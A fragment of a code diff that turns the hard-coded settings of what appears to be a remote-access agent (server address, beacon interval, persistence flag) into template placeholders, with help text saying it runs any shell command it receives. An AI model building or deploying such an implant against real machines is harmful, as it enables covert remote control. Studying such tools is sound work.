@@ -1,8 +1,8 @@
-SERVER = "http://localhost:8080"
-HELLO_INTERVAL = 2
-IDLE_TIME = 60
-MAX_FAILED_CONNECTIONS = 10
-PERSIST = True
+SERVER = "__SERVER__"
+HELLO_INTERVAL = __HELLO_INTERVAL__
+IDLE_TIME = __IDLE_TIME__
+MAX_FAILED_CONNECTIONS = __MAX_FAILED_CONNECTIONS__
+PERSIST = __PERSIST__
 HELP = """
 <any shell command>
 Executes the command in a shell and return its output.
